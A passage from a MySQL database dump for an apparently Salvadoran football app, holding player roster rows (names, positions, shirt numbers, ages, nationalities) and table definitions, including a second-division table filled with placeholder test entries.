(492,18,'Ovidio Hernández','centrodelantero',NULL,NULL,18,'Salvadoreña','2026-07-26 08:44:36',NULL,NULL,NULL,NULL,0),
(493,18,'Felix Sanchez','central',NULL,NULL,36,'Salvadoreña','2026-07-26 08:44:36',NULL,NULL,NULL,NULL,0),
(494,18,'Mauricio Gómez','medio_central',NULL,NULL,25,'Salvadoreña','2026-07-26 08:44:36',NULL,NULL,NULL,NULL,0),
(495,18,'Christopher Jimmy Najarro Galdámez','medio_central',24,NULL,21,'Salvadoreña','2026-07-26 08:44:36',NULL,NULL,NULL,NULL,0),
(496,18,'Eduardo Pinto','medio_central',NULL,NULL,20,'Salvadoreña','2026-07-26 08:44:36',NULL,NULL,NULL,NULL,0),
(497,18,'Carlos Herrera','central',NULL,NULL,28,'Salvadoreña','2026-07-26 08:44:36',NULL,NULL,NULL,NULL,0),
(498,18,'Cristofer Maldonado','portero',NULL,NULL,22,'Salvadoreña','2026-07-26 08:44:36',NULL,NULL,NULL,NULL,0),
(499,18,'Balmore Pineda','portero',NULL,NULL,28,'Salvadoreña','2026-07-26 08:44:36',NULL,NULL,NULL,NULL,0),
(500,18,'Franco Chinchilla','portero',NULL,NULL,NULL,'Salvadoreña','2026-07-26 08:44:36',NULL,NULL,NULL,NULL,0),
(501,15,'Nelson Bonilla','centrodelantero',9,NULL,35,'Salvadoreña','2026-07-26 08:49:34',NULL,NULL,NULL,NULL,0),
(502,15,'Rafael Tejada','centrodelantero',7,NULL,23,'Salvadoreña','2026-07-26 08:49:34',NULL,NULL,NULL,NULL,0),
(503,15,'Edgar Medrano','centrodelantero',13,NULL,31,'Colombiana','2026-07-26 08:49:34',NULL,NULL,NULL,NULL,0),
(504,15,'César Díaz','centrodelantero',17,NULL,24,'Chilena','2026-07-26 08:49:34',NULL,NULL,NULL,NULL,0),
(505,15,'Melvin Urbina','extremo_derecho',12,NULL,19,'Salvadoreña','2026-07-26 08:49:34',NULL,NULL,NULL,NULL,0),
(506,15,'Wilber Díaz','centrodelantero',NULL,NULL,19,'Salvadoreña','2026-07-26 08:49:34',NULL,NULL,NULL,NULL,0),
(507,15,'Kevin Santamaría','medio_ofensivo',17,NULL,35,'Salvadoreña','2026-07-26 08:49:34',NULL,NULL,NULL,NULL,0),
(508,15,'Yan Maciel','medio_central',20,NULL,29,'Brasileña','2026-07-26 08:49:34',NULL,NULL,NULL,NULL,0),
(509,15,'Elmer Bonilla','medio_central',6,NULL,23,'Salvadoreña','2026-07-26 08:49:34',NULL,NULL,NULL,NULL,0),
(510,15,'José Isaac Portillo','medio_central',5,NULL,26,'Salvadoreña','2026-07-26 08:49:34',NULL,NULL,NULL,NULL,0),
(511,15,'Roberto Melgar','medio_central',19,NULL,31,'Salvadoreña','2026-07-26 08:49:34',NULL,NULL,NULL,NULL,0),
(512,15,'Jonathan Nolasco','medio_central',8,NULL,29,'Salvadoreña','2026-07-26 08:49:34',NULL,NULL,NULL,NULL,0),
(513,15,'Josue Cartagena','medio_central',26,NULL,27,'Estadounidense','2026-07-26 08:49:34',NULL,NULL,NULL,NULL,0),
(514,15,'Samuel Rosales','medio_central',15,NULL,21,'Salvadoreña','2026-07-26 08:49:34',NULL,NULL,NULL,NULL,0),
(515,15,'David Montejo','medio_central',37,NULL,20,'Salvadoreña','2026-07-26 08:49:34',NULL,NULL,NULL,NULL,0),
(516,15,'Diego Rosales','medio_central',58,NULL,22,'Salvadoreña','2026-07-26 08:49:34',NULL,NULL,NULL,NULL,0),
(517,15,'Jorge Cruz','central',29,NULL,26,'Salvadoreña','2026-07-26 08:49:34',NULL,NULL,NULL,NULL,0),
(518,15,'Rudy Clavel','lateral_derecho',28,NULL,29,'Salvadoreña','2026-07-26 08:49:34',NULL,NULL,NULL,NULL,0),
(519,15,'Miguel Murillo','central',3,NULL,28,'Colombiana','2026-07-26 08:49:34',NULL,NULL,NULL,NULL,0),
(520,15,'José Guevara','central',2,NULL,28,'Salvadoreña','2026-07-26 08:49:34',NULL,NULL,NULL,NULL,0),
(521,15,'Juan Vega','central',16,NULL,27,'Mexicana','2026-07-26 08:49:34',NULL,NULL,NULL,NULL,0),
(522,15,'Edson Meléndez','central',4,NULL,32,'Salvadoreña','2026-07-26 08:49:34',NULL,NULL,NULL,NULL,0),
(523,15,'Kevin Ardón','central',NULL,NULL,24,'Salvadoreña','2026-07-26 08:49:34',NULL,NULL,NULL,NULL,0),
(524,15,'Kevin Carabantes','portero',1,NULL,31,'Salvadoreña','2026-07-26 08:49:34',NULL,NULL,NULL,NULL,0),
(525,15,'Jonathan Valle','portero',25,NULL,25,'Salvadoreña','2026-07-26 08:49:34',NULL,NULL,NULL,NULL,0),
(526,5,'Francis Castillo-Orellana','centrodelantero',16,NULL,20,'Salvadoreña','2026-07-26 08:52:39',NULL,NULL,NULL,NULL,0),
(527,5,'Gustavo Moura','centrodelantero',11,NULL,30,'Brasileña','2026-07-26 08:52:39',NULL,NULL,NULL,NULL,0),
(528,5,'José Barreto','extremo_izquierdo',19,NULL,26,'Argentina','2026-07-26 08:52:39',NULL,NULL,NULL,NULL,0),
(529,5,'Noel Rivera','centrodelantero',26,NULL,22,'Salvadoreña','2026-07-26 08:52:39',NULL,NULL,NULL,NULL,0),
(530,5,'Juan Portillo','extremo_izquierdo',11,NULL,34,'Salvadoreña','2026-07-26 08:52:39',NULL,NULL,NULL,NULL,0),
(531,5,'Luis Tobar','centrodelantero',45,NULL,18,'Salvadoreña','2026-07-26 08:52:39',NULL,NULL,NULL,NULL,0),
(532,5,'Eduardo Rivas','centrodelantero',NULL,NULL,22,'Salvadoreña','2026-07-26 08:52:39',NULL,NULL,NULL,NULL,0),
(533,5,'Harold Osorio','medio_central',45,NULL,22,'Salvadoreña','2026-07-26 08:52:39',NULL,NULL,NULL,NULL,0),
(534,5,'Matias Mier','medio_ofensivo',24,NULL,35,'Uruguaya','2026-07-26 08:52:39',NULL,NULL,NULL,NULL,0),
(535,5,'Leonardo Menjívar','extremo_izquierdo',10,NULL,24,'Salvadoreña','2026-07-26 08:52:39',NULL,NULL,NULL,NULL,0),
(536,5,'Narciso Orellana','medio_central',6,NULL,31,'Salvadoreña','2026-07-26 08:52:39',NULL,NULL,NULL,NULL,0),
(537,5,'Bryan Tamacas','lateral_derecho',21,NULL,31,'Salvadoreña','2026-07-26 08:52:39',NULL,NULL,NULL,NULL,0),
(538,5,'Juan Cruz Monteagudo','central',NULL,NULL,30,'Argentina','2026-07-26 08:52:39',NULL,NULL,NULL,NULL,0),
(539,5,'Julio Sibrián','central',2,NULL,30,'Salvadoreña','2026-07-26 08:52:39',NULL,NULL,NULL,NULL,0),
(540,5,'Henry Romero','central',16,NULL,34,'Salvadoreña','2026-07-26 08:52:39',NULL,NULL,NULL,NULL,0),
(541,5,'Nelson Rodríguez','central',3,NULL,23,'Salvadoreña','2026-07-26 08:52:39',NULL,NULL,NULL,NULL,0),
(542,5,'Alejandro Henríquez','lateral_izquierdo',20,NULL,23,'Salvadoreña','2026-07-26 08:52:39',NULL,NULL,NULL,NULL,0),
(543,5,'Jairo Soriano','central',3,NULL,31,'Guatemalteca','2026-07-26 08:52:39',NULL,NULL,NULL,NULL,0),
(544,5,'Jafet Soriano','central',30,NULL,30,'Guatemalteca','2026-07-26 08:52:39',NULL,NULL,NULL,NULL,0),
(545,5,'Emerson Hernández','lateral_derecho',29,NULL,24,'Salvadoreña','2026-07-26 08:52:39',NULL,NULL,NULL,NULL,0),
(546,5,'Willian Flores','central',16,NULL,26,'Salvadoreña','2026-07-26 08:52:39',NULL,NULL,NULL,NULL,0),
(547,5,'Roberto Rivas','central',NULL,NULL,23,'Salvadoreña','2026-07-26 08:52:39',NULL,NULL,NULL,NULL,0),
(548,5,'Marlon Joya','portero',1,NULL,24,'Salvadoreña','2026-07-26 08:52:39',NULL,NULL,NULL,NULL,0),
(549,5,'Daniel Franco','portero',NULL,NULL,19,'Salvadoreña','2026-07-26 08:52:39',NULL,NULL,NULL,NULL,0),
(550,12,'Carlos Salazar','centrodelantero',NULL,NULL,30,'Colombiana','2026-07-26 08:58:02',NULL,NULL,NULL,NULL,0),
(551,12,'Joshua Gallardo','centrodelantero',99,NULL,23,'Panameña','2026-07-26 08:58:02',NULL,NULL,NULL,NULL,0),
(552,12,'Allan Acevedo','centrodelantero',NULL,NULL,24,'Salvadoreña','2026-07-26 08:58:02',NULL,NULL,NULL,NULL,0),
(553,12,'Ronald Aparicio','centrodelantero',NULL,NULL,24,'Salvadoreña','2026-07-26 08:58:02',NULL,NULL,NULL,NULL,0),
(554,12,'Carlos Martínez','centrodelantero',NULL,NULL,23,'Salvadoreña','2026-07-26 08:58:02',NULL,NULL,NULL,NULL,0),
(555,12,'Ángel Caicedo','medio_ofensivo',NULL,NULL,25,'Panameña','2026-07-26 08:58:02',NULL,NULL,NULL,NULL,0),
(556,12,'Francisco Escobar','medio_central',NULL,NULL,30,'Salvadoreña','2026-07-26 08:58:02',NULL,NULL,NULL,NULL,0),
(557,12,'Wilson Rugama','medio_central',14,NULL,36,'Salvadoreña','2026-07-26 08:58:02',NULL,NULL,NULL,NULL,0),
(558,12,'Fernando Clavel','medio_central',NULL,NULL,26,'Salvadoreña','2026-07-26 08:58:02',NULL,NULL,NULL,NULL,0),
(559,12,'Jordy Bonilla','medio_central',8,NULL,30,'Salvadoreña','2026-07-26 08:58:02',NULL,NULL,NULL,NULL,0),
(560,12,'Vinicius Santana','central',16,NULL,27,'Brasileña','2026-07-26 08:58:02',NULL,NULL,NULL,NULL,0),
(561,12,'Giovanni Ávila','central',NULL,NULL,26,'Salvadoreña','2026-07-26 08:58:02',NULL,NULL,NULL,NULL,0),
(562,12,'Alexander Rodríguez','central',NULL,NULL,27,'Salvadoreña','2026-07-26 08:58:02',NULL,NULL,NULL,NULL,0),
(563,12,'Walter Guevara','central',4,NULL,33,'Salvadoreña','2026-07-26 08:58:02',NULL,NULL,NULL,NULL,0),
(564,12,'Jonathan Quintanilla','central',6,NULL,25,'Salvadoreña','2026-07-26 08:58:02',NULL,NULL,NULL,NULL,0),
(565,12,'Edwin Córdova','central',NULL,NULL,25,'Salvadoreña','2026-07-26 08:58:02',NULL,NULL,NULL,NULL,0),
(566,12,'Alexis Renderos','central',17,NULL,28,'Salvadoreña','2026-07-26 08:58:02',NULL,NULL,NULL,NULL,0),
(567,12,'Juan Benítez','central',NULL,NULL,28,'Salvadoreña','2026-07-26 08:58:02',NULL,NULL,NULL,NULL,0),
(568,12,'Kevin Oviedo','central',NULL,NULL,28,'Salvadoreña','2026-07-26 08:58:02',NULL,NULL,NULL,NULL,0),
(569,12,'Emerson Mancía','central',NULL,NULL,25,'Salvadoreña','2026-07-26 08:58:02',NULL,NULL,NULL,NULL,0),
(570,12,'Héctor Ramírez','portero',NULL,NULL,35,'Salvadoreña','2026-07-26 08:58:02',NULL,NULL,NULL,NULL,0),
(571,4,'Styven Vásquez','centrodelantero',7,NULL,23,'Salvadoreña','2026-07-26 09:00:37',NULL,NULL,NULL,NULL,0),
(572,4,'José Valencia','centrodelantero',20,NULL,34,'Colombiana','2026-07-26 09:00:37',NULL,NULL,NULL,NULL,0),
(573,4,'Cristian Gil','centrodelantero',19,NULL,29,'Salvadoreña','2026-07-26 09:00:37',NULL,NULL,NULL,NULL,0),
(574,4,'Nelson Díaz','centrodelantero',35,NULL,20,'Salvadoreña','2026-07-26 09:00:37',NULL,NULL,NULL,NULL,0),
(575,4,'Michell Mercado','centrodelantero',26,NULL,34,'Salvadoreña','2026-07-26 09:00:37',NULL,NULL,NULL,NULL,0),
(576,4,'Óscar Cerén','extremo_derecho',16,NULL,34,'Salvadoreña','2026-07-26 09:00:37',NULL,NULL,NULL,NULL,0),
(577,4,'Elías Gumero','centrodelantero',21,NULL,26,'Salvadoreña','2026-07-26 09:00:37',NULL,NULL,NULL,NULL,0),
(578,4,'Diego Guevara','centrodelantero',23,NULL,24,'Salvadoreña','2026-07-26 09:00:37',NULL,NULL,NULL,NULL,0),
(579,4,'Mauro González','medio_central',NULL,NULL,29,'Argentina','2026-07-26 09:00:37',NULL,NULL,NULL,NULL,0),
(580,4,'Mauricio Cerritos','medio_defensivo',17,NULL,22,'Salvadoreña','2026-07-26 09:00:37',NULL,NULL,NULL,NULL,0),
(581,4,'Brayan Landaverde','medio_central',8,NULL,31,'Salvadoreña','2026-07-26 09:00:37',NULL,NULL,NULL,NULL,0),
(582,4,'Rafael Águila','medio_central',28,NULL,29,'Panameña','2026-07-26 09:00:37',NULL,NULL,NULL,NULL,0),
(583,4,'Víctor García','extremo_izquierdo',10,NULL,31,'Salvadoreña','2026-07-26 09:00:37',NULL,NULL,NULL,NULL,0),
(584,4,'Kevin Ascencio','medio_central',30,NULL,21,'Salvadoreña','2026-07-26 09:00:37',NULL,NULL,NULL,NULL,0),
(585,4,'Erivan Flores','medio_central',4,NULL,29,'Salvadoreña','2026-07-26 09:00:37',NULL,NULL,NULL,NULL,0),
(586,4,'Diego Ortez','medio_central',27,NULL,22,'Salvadoreña','2026-07-26 09:00:37',NULL,NULL,NULL,NULL,0),
(587,4,'Marvin Aranda','medio_central',15,NULL,27,'Salvadoreña','2026-07-26 09:00:37',NULL,NULL,NULL,NULL,0),
(588,4,'Steven Mira','medio_central',NULL,NULL,21,'Salvadoreña','2026-07-26 09:00:37',NULL,NULL,NULL,NULL,0),
(589,4,'Diego Flores','lateral_izquierdo',12,NULL,25,'Salvadoreña','2026-07-26 09:00:37',NULL,NULL,NULL,NULL,0),
(590,4,'Wilber Arizala','central',3,NULL,30,'Colombiana','2026-07-26 09:00:37',NULL,NULL,NULL,NULL,0),
(591,4,'Lizandro Claros','central',5,NULL,28,'Salvadoreña','2026-07-26 09:00:37',NULL,NULL,NULL,NULL,0),
(592,4,'Eduardo Vigil','central',6,NULL,29,'Salvadoreña','2026-07-26 09:00:37',NULL,NULL,NULL,NULL,0),
(593,4,'Jonathan Jiménez','central',24,NULL,34,'Salvadoreña','2026-07-26 09:00:37',NULL,NULL,NULL,NULL,0),
(594,4,'Marlon Cornejo','extremo_izquierdo',2,NULL,32,'Salvadoreña','2026-07-26 09:00:37',NULL,NULL,NULL,NULL,0),
(595,4,'Elmer Rodríguez','central',36,NULL,18,'Salvadoreña','2026-07-26 09:00:37',NULL,NULL,NULL,NULL,0),
(596,4,'Herson Rodríguez','central',14,NULL,22,'Salvadoreña','2026-07-26 09:00:37',NULL,NULL,NULL,NULL,0),
(597,4,'Geonathan Barrera','portero',1,NULL,21,'Salvadoreña','2026-07-26 09:00:37',NULL,NULL,NULL,NULL,0),
(598,4,'Misael Erazo','portero',NULL,NULL,27,'Salvadoreña','2026-07-26 09:00:37',NULL,NULL,NULL,NULL,0),
(599,4,'Felipe Amaya','portero',25,NULL,37,'Salvadoreña','2026-07-26 09:00:37',NULL,NULL,NULL,NULL,0),
(600,7,'Juan Carlos Argueta','centrodelantero',NULL,NULL,26,'Salvadoreña','2026-07-26 09:02:37',NULL,NULL,NULL,NULL,0),
(601,7,'Wilma Torres','centrodelantero',NULL,NULL,32,'Salvadoreña','2026-07-26 09:02:37',NULL,NULL,NULL,NULL,0),
(602,7,'Javier Ferman','centrodelantero',30,NULL,30,'Salvadoreña','2026-07-26 09:02:37',NULL,NULL,NULL,NULL,0),
(603,7,'Danis Cerros','centrodelantero',15,NULL,27,'Salvadoreña','2026-07-26 09:02:37',NULL,NULL,NULL,NULL,0),
(604,7,'Israel Escalante','extremo_izquierdo',NULL,NULL,27,'Argentina','2026-07-26 09:02:37',NULL,NULL,NULL,NULL,0),
(605,7,'Jefferson Valladares','lateral_derecho',15,NULL,23,'Salvadoreña','2026-07-26 09:02:37',NULL,NULL,NULL,NULL,0),
(606,7,'Ányelo Rodríguez','medio_central',NULL,NULL,30,'Uruguaya','2026-07-26 09:02:37',NULL,NULL,NULL,NULL,0),
(607,7,'Gerson Mayen','medio_central',NULL,NULL,36,'Salvadoreña','2026-07-26 09:02:37',NULL,NULL,NULL,NULL,0),
(608,7,'Enmanuel Hernández','medio_central',12,NULL,26,'Salvadoreña','2026-07-26 09:02:37',NULL,NULL,NULL,NULL,0),
(609,7,'Marvin Ramos','medio_central',10,NULL,33,'Salvadoreña','2026-07-26 09:02:37',NULL,NULL,NULL,NULL,0),
(610,7,'Jefferson Martinez','medio_central',NULL,NULL,19,'Salvadoreña','2026-07-26 09:02:37',NULL,NULL,NULL,NULL,0),
(611,7,'Rudy Ramírez','medio_central',NULL,NULL,24,'Salvadoreña','2026-07-26 09:02:37',NULL,NULL,NULL,NULL,0),
(612,7,'Elvis Claros','central',19,NULL,25,'Salvadoreña','2026-07-26 09:02:37',NULL,NULL,NULL,NULL,0),
(613,7,'Franco Matías Bentín','central',15,NULL,31,'Uruguaya','2026-07-26 09:02:37',NULL,NULL,NULL,NULL,0),
(614,7,'William Molina','central',NULL,NULL,21,'Salvadoreña','2026-07-26 09:02:37',NULL,NULL,NULL,NULL,0),
(615,7,'Fredy Espinoza','central',2,NULL,34,'Salvadoreña','2026-07-26 09:02:37',NULL,NULL,NULL,NULL,0),
(616,7,'Rafael García','portero',1,NULL,36,'Uruguaya','2026-07-26 09:02:37',NULL,NULL,NULL,NULL,0),
(617,7,'Oscar Sánchez','portero',NULL,NULL,35,'Salvadoreña','2026-07-26 09:02:37',NULL,NULL,NULL,NULL,0),
(618,11,'Yair Arboleda','extremo_derecho',31,NULL,30,'Colombiana','2026-07-26 09:05:02',NULL,NULL,NULL,NULL,0),
(619,11,'Carlos Bogotá','centrodelantero',11,NULL,24,'Colombiana','2026-07-26 09:05:02',NULL,NULL,NULL,NULL,0),
(620,11,'David Zayas','centrodelantero',NULL,NULL,22,'Salvadoreña','2026-07-26 09:05:02',NULL,NULL,NULL,NULL,0),
(621,11,'Bryan Ríos','centrodelantero',NULL,NULL,21,'Salvadoreña','2026-07-26 09:05:02',NULL,NULL,NULL,NULL,0),
(622,11,'Manuel González','centrodelantero',NULL,NULL,36,'Colombiana','2026-07-26 09:05:02',NULL,NULL,NULL,NULL,0),
(623,11,'Luis Aguilar','centrodelantero',NULL,NULL,23,'Salvadoreña','2026-07-26 09:05:02',NULL,NULL,NULL,NULL,0),
(624,11,'Jefferson Roque','medio_central',NULL,NULL,19,'Salvadoreña','2026-07-26 09:05:02',NULL,NULL,NULL,NULL,0),
(625,11,'Vinicio Muñoz','medio_central',20,NULL,24,'Salvadoreña','2026-07-26 09:05:02',NULL,NULL,NULL,NULL,0),
(626,11,'José Ventura','medio_central',28,NULL,28,'Salvadoreña','2026-07-26 09:05:02',NULL,NULL,NULL,NULL,0),
(627,11,'Josué Palacios','medio_central',33,NULL,23,'Salvadoreña','2026-07-26 09:05:02',NULL,NULL,NULL,NULL,0),
(628,11,'Franklin Martínez','medio_central',NULL,NULL,21,'Salvadoreña','2026-07-26 09:05:02',NULL,NULL,NULL,NULL,0),
(629,11,'Isaí Aguilar','medio_central',NULL,NULL,28,'Salvadoreña','2026-07-26 09:05:02',NULL,NULL,NULL,NULL,0),
(630,11,'Wilmer Novoa','medio_central',7,NULL,31,'Salvadoreña','2026-07-26 09:05:02',NULL,NULL,NULL,NULL,0),
(631,11,'Anthony Roque','medio_central',NULL,NULL,30,'Salvadoreña','2026-07-26 09:05:02',NULL,NULL,NULL,NULL,0),
(632,11,'Brayam Palacios','central',99,NULL,27,'Colombiana','2026-07-26 09:05:02',NULL,NULL,NULL,NULL,0),
(633,11,'Moises Xavier Garcia','central',NULL,NULL,36,'Salvadoreña','2026-07-26 09:05:02',NULL,NULL,NULL,NULL,0),
(634,11,'Kevin Menjívar','central',NULL,NULL,25,'Salvadoreña','2026-07-26 09:05:02',NULL,NULL,NULL,NULL,0),
(635,11,'Diego Mejía','central',NULL,NULL,20,'Salvadoreña','2026-07-26 09:05:02',NULL,NULL,NULL,NULL,0),
(636,11,'Kevin Calderón','central',4,NULL,32,'Salvadoreña','2026-07-26 09:05:02',NULL,NULL,NULL,NULL,0),
(637,11,'Carlos Arévalo','central',2,NULL,38,'Salvadoreña','2026-07-26 09:05:02',NULL,NULL,NULL,NULL,0),
(638,11,'Cristopher Rauda','portero',1,NULL,31,'Salvadoreña','2026-07-26 09:05:02',NULL,NULL,NULL,NULL,0),
(639,11,'Daniel Arroyo','portero',NULL,NULL,36,'Salvadoreña','2026-07-26 09:05:02',NULL,NULL,NULL,NULL,0),
(640,11,'William Torres','portero',NULL,NULL,33,'Salvadoreña','2026-07-26 09:05:02',NULL,NULL,NULL,NULL,0),
(641,11,'Máximo Sandoval','portero',NULL,NULL,18,'Salvadoreña','2026-07-26 09:05:02',NULL,NULL,NULL,NULL,0),
(642,10,'Jomal Williams','extremo_izquierdo',9,NULL,32,'Trinitense','2026-07-26 09:06:52',NULL,NULL,NULL,NULL,0),
(643,10,'Dany Cetré','centrodelantero',21,NULL,28,'Ecuatoriana','2026-07-26 09:06:52',NULL,NULL,NULL,NULL,0),
(644,10,'Paolo Ulloa','centrodelantero',NULL,NULL,25,'Salvadoreña','2026-07-26 09:06:52',NULL,NULL,NULL,NULL,0),
(645,10,'Hernán González','centrodelantero',NULL,NULL,34,'Argentina','2026-07-26 09:06:52',NULL,NULL,NULL,NULL,0),
(646,10,'Elias Umeres','extremo_izquierdo',NULL,NULL,30,'Argentina','2026-07-26 09:06:52',NULL,NULL,NULL,NULL,0),
(647,10,'Herbert Sosa','medio_ofensivo',7,NULL,36,'Salvadoreña','2026-07-26 09:06:52',NULL,NULL,NULL,NULL,0),
(648,10,'Anderson Portillo','medio_central',NULL,NULL,18,'Salvadoreña','2026-07-26 09:06:52',NULL,NULL,NULL,NULL,0),
(649,10,'William Canales','central',NULL,NULL,31,'Salvadoreña','2026-07-26 09:06:52',NULL,NULL,NULL,NULL,0),
(650,10,'José Galindo','central',NULL,NULL,32,'Salvadoreña','2026-07-26 09:06:52',NULL,NULL,NULL,NULL,0),
(651,10,'Guillermo Fuentes','central',NULL,NULL,24,'Salvadoreña','2026-07-26 09:06:52',NULL,NULL,NULL,NULL,0),
(652,10,'Ronald Padilla','central',NULL,NULL,30,'Salvadoreña','2026-07-26 09:06:52',NULL,NULL,NULL,NULL,0),
(653,10,'Francisco Carballo','central',NULL,NULL,31,'Salvadoreña','2026-07-26 09:06:52',NULL,NULL,NULL,NULL,0),
(654,10,'Reinaldo Aparicio','central',NULL,NULL,33,'Salvadoreña','2026-07-26 09:06:52',NULL,NULL,NULL,NULL,0),
(655,10,'Jeremy Rodríguez','portero',NULL,NULL,21,'Panameña','2026-07-26 09:06:52',NULL,NULL,NULL,NULL,0),
(656,10,'Cristian Bonilla','portero',NULL,NULL,21,'Salvadoreña','2026-07-26 09:06:52',NULL,NULL,NULL,NULL,0),
(657,10,'Wilberth Hernández','medio_central',NULL,NULL,32,'Salvadoreña','2026-07-26 09:06:52',NULL,NULL,NULL,NULL,0),
(658,9,'Steven Guerra','centrodelantero',21,NULL,21,'Salvadoreña','2026-07-26 09:08:33',NULL,NULL,NULL,NULL,0),
(659,9,'Kevin Reyes','centrodelantero',7,NULL,26,'Salvadoreña','2026-07-26 09:08:33',NULL,NULL,NULL,NULL,0),
(660,9,'Federico Haberkorn','centrodelantero',NULL,NULL,31,'Argentina','2026-07-26 09:08:33',NULL,NULL,NULL,NULL,0),
(661,9,'José Posada','centrodelantero',28,NULL,26,'Salvadoreña','2026-07-26 09:08:33',NULL,NULL,NULL,NULL,0),
(662,9,'Uriel Miranda','centrodelantero',NULL,NULL,19,'Salvadoreña','2026-07-26 09:08:33',NULL,NULL,NULL,NULL,0),
(663,9,'Melvin Cartagena','medio_central',14,NULL,26,'Salvadoreña','2026-07-26 09:08:33',NULL,NULL,NULL,NULL,0),
(664,9,'Gustavo Machado','extremo_derecho',80,NULL,25,'Uruguaya','2026-07-26 09:08:33',NULL,NULL,NULL,NULL,0),
(665,9,'Marvin Monterroza','medio_ofensivo',21,NULL,35,'Salvadoreña','2026-07-26 09:08:33',NULL,NULL,NULL,NULL,0),
(666,9,'Emerson Sandoval','medio_central',NULL,NULL,25,'Salvadoreña','2026-07-26 09:08:33',NULL,NULL,NULL,NULL,0),
(667,9,'Cesar Flores','extremo_derecho',8,NULL,30,'Salvadoreña','2026-07-26 09:08:33',NULL,NULL,NULL,NULL,0),
(668,9,'Julio Amaya','medio_central',14,NULL,31,'Salvadoreña','2026-07-26 09:08:33',NULL,NULL,NULL,NULL,0),
(669,9,'Carlos Ortiz','medio_central',NULL,NULL,26,'Salvadoreña','2026-07-26 09:08:33',NULL,NULL,NULL,NULL,0),
(670,9,'Eduardo Galdamez','medio_central',NULL,NULL,18,'Salvadoreña','2026-07-26 09:08:33',NULL,NULL,NULL,NULL,0),
(671,9,'Melvin Cruz','central',3,NULL,25,'Salvadoreña','2026-07-26 09:08:33',NULL,NULL,NULL,NULL,0),
(672,9,'Miguel Lemus','central',NULL,NULL,32,'Salvadoreña','2026-07-26 09:08:33',NULL,NULL,NULL,NULL,0),
(673,9,'José Zaldaña','central',6,NULL,22,'Salvadoreña','2026-07-26 09:08:33',NULL,NULL,NULL,NULL,0),
(674,9,'Nicolás Gómez','central',NULL,NULL,34,'Uruguaya','2026-07-26 09:08:33',NULL,NULL,NULL,NULL,0),
(675,9,'Mario Jacobo','central',NULL,NULL,29,'Salvadoreña','2026-07-26 09:08:33',NULL,NULL,NULL,NULL,0),
(676,9,'Kevin Vidal','central',15,NULL,26,'Salvadoreña','2026-07-26 09:08:33',NULL,NULL,NULL,NULL,0),
(677,9,'Hugo Aguilar','central',NULL,NULL,19,'Salvadoreña','2026-07-26 09:08:33',NULL,NULL,NULL,NULL,0),
(678,9,'Raúl Cruz','central',NULL,NULL,32,'Salvadoreña','2026-07-26 09:08:33',NULL,NULL,NULL,NULL,0),
(679,9,'Javier Colli','portero',NULL,NULL,34,'Argentina','2026-07-26 09:08:33',NULL,NULL,NULL,NULL,0),
(680,9,'Óscar Pleitez','portero',1,NULL,33,'Salvadoreña','2026-07-26 09:08:33',NULL,NULL,NULL,NULL,0),
(681,9,'Alfredo Esquivel','portero',NULL,NULL,18,'Salvadoreña','2026-07-26 09:08:33',NULL,NULL,NULL,NULL,0);
/*!40000 ALTER TABLE `jugadores` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jugadores_ascenso`
--

DROP TABLE IF EXISTS `jugadores_ascenso`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `jugadores_ascenso` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `equipo_id` int(11) NOT NULL,
  `nombre` varchar(150) NOT NULL,
  `posicion` varchar(30) NOT NULL DEFAULT 'centrodelantero',
  `numero_camiseta` int(11) DEFAULT NULL,
  `foto` varchar(255) DEFAULT NULL,
  `edad` int(11) DEFAULT NULL,
  `nacionalidad` varchar(100) DEFAULT NULL,
  `fecha_creacion` timestamp NULL DEFAULT current_timestamp(),
  `posicion_x` decimal(5,2) DEFAULT NULL,
  `posicion_y` decimal(5,2) DEFAULT NULL,
  `pos_x` float DEFAULT NULL,
  `pos_y` float DEFAULT NULL,
  `es_titular` tinyint(1) DEFAULT 0,
  PRIMARY KEY (`id`),
  KEY `equipo_id` (`equipo_id`)
) ENGINE=InnoDB AUTO_INCREMENT=13 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jugadores_ascenso`
--

LOCK TABLES `jugadores_ascenso` WRITE;
/*!40000 ALTER TABLE `jugadores_ascenso` DISABLE KEYS */;
INSERT INTO `jugadores_ascenso` VALUES
(1,4,'esemaje','central',34,'uploads/jugadores_segunda/1775967215_ba8a0ca9.png',23,'223223','2026-04-12 04:13:46',NULL,NULL,NULL,NULL,1),
(2,4,'eseotromaje','lateral_derecho',14,'uploads/jugadores_segunda/1775967235_ab9a59cd.png',34,'13232123','2026-04-12 04:14:17',NULL,NULL,NULL,NULL,1),
(3,4,'Neuer','portero',1,NULL,20,'Aleman','2026-04-18 17:58:00',NULL,NULL,NULL,NULL,1),
(4,4,'Lateral I','lateral_izquierdo',2,NULL,30,NULL,'2026-04-18 17:58:17',NULL,NULL,NULL,NULL,1),
(5,4,'OTRO DF','central',5,NULL,NULL,NULL,'2026-04-18 17:58:47',NULL,NULL,NULL,NULL,1),
(6,4,'MCD','medio_defensivo',5,NULL,20,NULL,'2026-04-18 17:59:11',NULL,NULL,NULL,NULL,1),
(7,4,'MC','medio_central',56,NULL,20,NULL,'2026-04-18 17:59:49',NULL,NULL,NULL,NULL,1),
(8,4,'MCO','medio_ofensivo',7,NULL,30,NULL,'2026-04-18 18:00:15',NULL,NULL,NULL,NULL,1),
(9,4,'dsds','centrodelantero',44,NULL,45,NULL,'2026-04-18 18:01:09',NULL,NULL,NULL,NULL,1),
(10,4,'SD','segundo_delantero',9,NULL,44,NULL,'2026-04-18 18:01:28',NULL,NULL,NULL,NULL,1),
(11,4,'extremo i','extremo_izquierdo',21,NULL,22,NULL,'2026-04-18 18:02:16',NULL,NULL,NULL,NULL,1),
(12,4,'EXT DER','extremo_derecho',65,NULL,21,NULL,'2026-04-18 18:03:07',NULL,NULL,NULL,NULL,0);
/*!40000 ALTER TABLE `jugadores_ascenso` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jugadores_femenina`
--

DROP TABLE IF EXISTS `jugadores_femenina`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `jugadores_femenina` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `equipo_id` int(11) NOT NULL,
  `nombre` varchar(150) NOT NULL,
  `posicion` varchar(30) NOT NULL DEFAULT 'centrodelantero',
